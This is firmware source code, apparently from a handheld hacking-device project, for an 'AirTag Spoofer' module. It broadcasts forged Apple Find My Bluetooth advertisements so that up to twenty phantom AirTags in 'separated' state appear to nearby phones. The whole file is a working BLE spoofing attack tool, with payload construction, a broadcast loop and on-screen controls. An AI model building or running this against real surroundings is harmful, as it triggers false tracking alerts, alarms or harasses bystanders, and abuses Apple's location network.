// ═══════════════════════════════════════════════════════════
// Arsenal - AirTag Spoofer
// Broadcasts fake Apple AirTag BLE advertisements
// Makes phantom AirTags appear on Find My network
// ═══════════════════════════════════════════════════════════

#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <BLEAdvertising.h>
#include <BLEDevice.h>
#include <globals.h>

static int spoofCount = 5;  // number of phantom AirTags
static bool spoofRunning = false;

// Apple FindMy advertisement structure
// Mimics an AirTag in "separated" state
static void setAirTagPayload(BLEAdvertising *adv, int index) {
    // Apple manufacturer specific data
    // Company ID: 0x004C (Apple)
    // Type: 0x12 (FindMy)
    // Length: 0x19
    // Status: 0x10 (separated)
    // Then 22 bytes of "public key" (random for each phantom)

    uint8_t payload[27];
    payload[0] = 0x12;  // FindMy type
    payload[1] = 0x19;  // Length
    payload[2] = 0x10;  // Status byte (separated state)

    // Random public key payload (makes each tag unique)
    for (int i = 3; i < 27; i++) {
        payload[i] = random(256);
    }

    // Seed uniqueness per index so each phantom is consistent between cycles
    randomSeed(index * 12345 + 67890);
    for (int i = 3; i < 9; i++) {
        payload[i] = random(256);
    }
    randomSeed(micros());  // re-randomize seed

    BLEAdvertisementData advData;

    // Set Apple manufacturer data
    String mfgData = "";
    mfgData += (char)0x4C;  // Apple company ID low byte
    mfgData += (char)0x00;  // Apple company ID high byte
    for (int i = 0; i < 27; i++) {
        mfgData += (char)payload[i];
    }
    advData.setManufacturerData(mfgData);

    adv->setAdvertisementData(advData);
}

void arsenal_airtag_spoofer(void) {
    ARSENAL_SAFE_RUN([]() {
        spoofRunning = true;
        int currentTag = 0;
        int totalBroadcasts = 0;

        BLEDevice::init("");
        BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();

        while (spoofRunning) {
            // Set payload for current phantom tag
            setAirTagPayload(pAdvertising, currentTag);

            // Start advertising
            pAdvertising->start();
            delay(100);  // Advertise for 100ms
            pAdvertising->stop();

            totalBroadcasts++;
            currentTag = (currentTag + 1) % spoofCount;

            // Draw UI
            drawMainBorderWithTitle("AirTag Spoofer");
            int y = 45;
            int padX = 12;

            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("Status: BROADCASTING");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.printf("Phantom Tags: %d", spoofCount);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Current: Tag #%d", currentTag + 1);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Broadcasts: %d", totalBroadcasts);
            y += 20;

            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Up/Down: adjust count");
            y += 14;
            tft.setCursor(padX, y);
            tft.printf("Range: %d tags", spoofCount);

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);

            // Handle input
            if (check(EscPress)) {
                spoofRunning = false;
                break;
            }
            if (check(UpPress) || check(NextPress)) {
                spoofCount++;
                if (spoofCount > 20) spoofCount = 20;
            }
            if (check(DownPress) || check(PrevPress)) {
                spoofCount--;
                if (spoofCount < 1) spoofCount = 1;
            }

            esp_task_wdt_reset();
            delay(50);
        }

        pAdvertising->stop();
        BLEDevice::deinit(false);
    });
}
